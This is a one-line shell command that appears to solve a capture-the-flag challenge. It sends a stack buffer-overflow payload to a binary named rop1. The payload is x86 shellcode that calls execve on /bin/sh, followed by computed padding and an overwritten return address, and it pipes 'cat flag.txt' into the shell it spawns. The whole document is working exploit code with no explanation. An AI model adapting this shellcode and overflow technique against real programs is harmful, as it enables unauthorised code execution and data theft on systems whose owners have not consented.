{ sleep 1; printf "cat flag.txt"; } | ./rop1 $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x
89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; perl -e "print 'x'x(64-23+8)"; printf "\x54\x0b\x05\x08";) 
